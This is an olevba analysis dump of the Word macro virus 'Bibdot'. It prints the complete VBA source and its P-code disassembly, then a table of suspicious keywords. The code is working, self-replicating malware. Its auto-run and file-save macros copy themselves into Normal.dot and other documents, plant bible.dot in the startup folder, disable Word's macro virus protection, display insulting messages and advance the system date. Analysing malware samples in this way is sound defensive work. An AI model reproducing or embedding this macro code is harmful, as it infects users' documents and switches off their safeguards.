olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bibdot
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Bible 
in file: Virus.MSWord.Bibdot - OLE stream: 'Bible'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Function installto()
On Error Resume Next
Application.ScreenUpdating = False
des = NormalTemplate.Path + "\" + NormalTemplate.Name
        Application.OrganizerCopy Source:=des, _
            Destination:=ActiveDocument.FullName, Name:="Bible", _
            Object:=wdOrganizerObjectProjectItems
Application.ScreenUpdating = True
End Function
Function Installstart()
On Error Resume Next
Application.ScreenUpdating = False
 If Dir(Application.StartupPath + "\bible.dot") = "bible.dot" Then
 Application.ScreenUpdating = True
 Exit Function
 End If
 Documents.Open (RecentFiles(1))
     ActiveDocument.SaveAs FileName:=Application.StartupPath + "\bible.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
         ActiveDocument.Close
        Application.ScreenUpdating = True
End Function
Function install()
On Error Resume Next
Application.ScreenUpdating = False
des = NormalTemplate.Path + "\" + NormalTemplate.Name
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
            Destination:=des, Name:="Bible", _
            Object:=wdOrganizerObjectProjectItems
        With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
        End With
        Application.DisplayRecentFiles = True
        RecentFiles.Maximum = 5
        NormalTemplate.Save
        Application.ScreenUpdating = True
End Function
Sub AutoOpen()
On Error Resume Next
Application.ScreenUpdating = False
Call install
Application.ScreenUpdating = True
End Sub


Sub AutoClose()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call install
Call Installstart
End If
End Sub
Sub AutoExit()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call install
Call Installstart
End If
End Sub

Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call installto
End Sub
Sub filesave()
On Error Resume Next
Call installto
ActiveDocument.Save
End Sub
Sub fileclose()
On Error Resume Next
If Left(ActiveDocument.Name, 8) <> "Document" Then
Call installto
Call Installstart
End If
End Sub
Sub viewvbcode()
On Error Resume Next
d = Format(Now, "dddd")
Select Case d
Case "Sunday"
    msg = "I am controlling your Computer"
Case "Monday"
    msg = "Don't fear I am controlling man!"
Case "Tuesday"
    msg = "Don't fear maaaaaaaaaan!"
Case "Wednesday"
    msg = "Cool down man! "
Case "Thursday"
    msg = "You are a imbecile..! "
Case "Friday"
    msg = "You are a fool... Stupid jerk... ahh..ahh..ahh"
Case "Saturday"
    msg = "Pooda Mairre ninak vere joli elliode..! "
End Select
MsgBox msg, vbInformation, "I am saying"
Date = Date + 1
End Sub
Sub ToolsMacro()
On Error Resume Next
MsgBox "Oops..! macro expired..!! ", vbExclamation, "Died"
End Sub
Sub FileTemplates()

End Sub
Sub AutoExec()
On Error Resume Next
If Hour(Now) >= 0 Then msg = "Good Morning..."
If Hour(Now) >= 12 Then msg = "Good Afternoon..."
If Hour(Now) >= 14 Then msg = "Good Evening..."
If Hour(Now) >= 20 Then msg = "Good Night..."
MsgBox msg & Application.UserName & Chr(10) & " Have a nice day", vbInformation, "Weclome"
If Month(Date) = 2 And Day(Date) = 23 Then MsgBox "*** Today is my Birthday ***", vbInformation, "Birthday"
If Month(Date) = 12 And Day(Date) = 25 Then MsgBox "*** Wish you a Happy Christmas ***", vbInformation, "Christmas"
If Month(Date) = 1 And Day(Date) = 1 Then MsgBox "*** Wish you a Happy New Year ***", vbInformation, "New Year"
If Month(Date) = 4 And Day(Date) = 1 And Hour(how) < 12 Then MsgBox "Today is your day! (Foolish day)", vbInformation, "Foolish"
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bibdot
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11147 bytes
' Macros/VBA/Bible - 6850 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Function installto())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #4:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Add 
' 	St des 
' Line #5:
' 	LineCont 0x0008 07 00 0C 00 11 00 0C 00
' 	Ld des 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bible"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #6:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #7:
' 	EndFunc 
' Line #8:
' 	FuncDefn (Function Installstart())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\bible.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0009 "bible.dot"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #13:
' 	ExitFunc 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	ArgsLd RecentFiles 0x0001 
' 	Paren 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #16:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\bible.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #17:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #18:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #19:
' 	EndFunc 
' Line #20:
' 	FuncDefn (Function install())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #23:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Add 
' 	St des 
' Line #24:
' 	LineCont 0x0008 09 00 0C 00 11 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld des 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bible"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #25:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #28:
' 	EndWith 
' Line #29:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #30:
' 	LitDI2 0x0005 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #31:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #32:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #33:
' 	EndFunc 
' Line #34:
' 	FuncDefn (Sub AutoOpen())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #37:
' 	ArgsCall (Call) install 0x0000 
' Line #38:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #39:
' 	EndSub 
' Line #40:
' Line #41:
' Line #42:
' 	FuncDefn (Sub AutoClose())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #45:
' 	ArgsCall (Call) installto 0x0000 
' Line #46:
' 	ArgsCall (Call) install 0x0000 
' Line #47:
' 	ArgsCall (Call) Installstart 0x0000 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub AutoExit())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #53:
' 	ArgsCall (Call) installto 0x0000 
' Line #54:
' 	ArgsCall (Call) install 0x0000 
' Line #55:
' 	ArgsCall (Call) Installstart 0x0000 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Sub FileSaveAs())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #62:
' 	ArgsCall (Call) installto 0x0000 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub filesave())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	ArgsCall (Call) installto 0x0000 
' Line #67:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub fileclose())
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #72:
' 	ArgsCall (Call) installto 0x0000 
' Line #73:
' 	ArgsCall (Call) Installstart 0x0000 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub viewvbcode())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	Ld Now 
' 	LitStr 0x0004 "dddd"
' 	ArgsLd Format$ 0x0002 
' 	St d 
' Line #79:
' 	Ld d 
' 	SelectCase 
' Line #80:
' 	LitStr 0x0006 "Sunday"
' 	Case 
' 	CaseDone 
' Line #81:
' 	LitStr 0x001E "I am controlling your Computer"
' 	St msg 
' Line #82:
' 	LitStr 0x0006 "Monday"
' 	Case 
' 	CaseDone 
' Line #83:
' 	LitStr 0x0020 "Don't fear I am controlling man!"
' 	St msg 
' Line #84:
' 	LitStr 0x0007 "Tuesday"
' 	Case 
' 	CaseDone 
' Line #85:
' 	LitStr 0x0018 "Don't fear maaaaaaaaaan!"
' 	St msg 
' Line #86:
' 	LitStr 0x0009 "Wednesday"
' 	Case 
' 	CaseDone 
' Line #87:
' 	LitStr 0x000F "Cool down man! "
' 	St msg 
' Line #88:
' 	LitStr 0x0008 "Thursday"
' 	Case 
' 	CaseDone 
' Line #89:
' 	LitStr 0x0016 "You are a imbecile..! "
' 	St msg 
' Line #90:
' 	LitStr 0x0006 "Friday"
' 	Case 
' 	CaseDone 
' Line #91:
' 	LitStr 0x002E "You are a fool... Stupid jerk... ahh..ahh..ahh"
' 	St msg 
' Line #92:
' 	LitStr 0x0008 "Saturday"
' 	Case 
' 	CaseDone 
' Line #93:
' 	LitStr 0x0028 "Pooda Mairre ninak vere joli elliode..! "
' 	St msg 
' Line #94:
' 	EndSelect 
' Line #95:
' 	Ld msg 
' 	Ld vbInformation 
' 	LitStr 0x000B "I am saying"
' 	ArgsCall MsgBox 0x0003 
' Line #96:
' 	Ld Date 
' 	LitDI2 0x0001 
' 	Add 
' 	St Date 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub ToolsMacro())
' Line #99:
' 	OnError (Resume Next) 
' Line #100:
' 	LitStr 0x001A "Oops..! macro expired..!! "
' 	Ld vbExclamation 
' 	LitStr 0x0004 "Died"
' 	ArgsCall MsgBox 0x0003 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub FileTemplates())
' Line #103:
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub AutoExec())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0000 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Good Morning..."
' 	St msg 
' 	EndIf 
' Line #108:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000C 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "Good Afternoon..."
' 	St msg 
' 	EndIf 
' Line #109:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000E 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Good Evening..."
' 	St msg 
' 	EndIf 
' Line #110:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0014 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Good Night..."
' 	St msg 
' 	EndIf 
' Line #111:
' 	Ld msg 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 " Have a nice day"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0007 "Weclome"
' 	ArgsCall MsgBox 0x0003 
' Line #112:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "*** Today is my Birthday ***"
' 	Ld vbInformation 
' 	LitStr 0x0008 "Birthday"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #113:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "*** Wish you a Happy Christmas ***"
' 	Ld vbInformation 
' 	LitStr 0x0009 "Christmas"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #114:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0021 "*** Wish you a Happy New Year ***"
' 	Ld vbInformation 
' 	LitStr 0x0008 "New Year"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #115:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld how 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x000C 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0020 "Today is your day! (Foolish day)"
' 	Ld vbInformation 
' 	LitStr 0x0007 "Foolish"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' Line #119:
' Line #120:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

